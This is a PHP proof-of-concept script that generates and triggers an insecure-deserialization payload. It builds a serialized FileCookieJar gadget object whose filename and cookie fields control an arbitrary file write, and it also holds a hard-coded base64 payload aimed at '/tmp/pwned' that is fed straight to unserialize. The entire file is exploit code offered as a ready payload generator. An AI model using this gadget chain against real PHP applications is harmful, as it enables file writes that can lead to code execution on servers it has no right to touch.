<?php                                                                                                                
require __DIR__ . "/vendor/autoload.php";                                                                            
                                                                                                                     
                                                                                                                     
class FileCookieJar {                                                                                                
        public $filename;                                                                                            
        public $storeSessionCookies;                                                                                 
        public $cookies;                                                                                             
}                                                                                                                    
                                                                                                                     
class SetCookie {                                                                                                    
        public $data;                                                                                                
}                                                                                                                    
                                                                                                                     
$GENERATE = true;                                                                                                    
                                                                                                                     
if ($GENERATE) {                                                                                                     
        $data = ['value1', 'value2'];                                                                                
        $setCookie = new SetCookie();                                                                                
        $setCookie->data = $data;                                                                                    
                                                                                                                     
        $cookies = [$setCookie];                                                                                     
        $filename = '/tmp2/jhdhw';                                                                                   
        $storeSessionCookies = true;                                                                                 
                                                                                                                     
        $fileCookieJar = new FileCookieJar();
        $fileCookieJar->cookies = $cookies;
        $fileCookieJar->filename = $filename;
        $fileCookieJar->storeSessionCookies = $storeSessionCookies;

        $data = serialize($fileCookieJar);
        unserialize($data);
        //echo $data . PHP_EOL;
        //echo base64_encode($data) . PHP_EOL;
}
else {
        unserialize(base64_decode("TzoxMzoiRmlsZUNvb2tpZUphciI6Mzp7czo4OiJmaWxlbmFtZSI7czoxMDoiL3RtcC9wd25lZCI7czoxOToic3RvcmVTZXNzaW9uQ29va2llcyI7YjoxO3M6NzoiY29va2llcyI7YToxOntpOjA7Tzo5OiJTZXRDb29raWUiOjE6e3M6NDoiZGF0YSI7YToyOntpOjA7czo2OiJ2YWx1ZTEiO2k6MTtzOjY6InZhbHVlMiI7fX19fQ=="));
}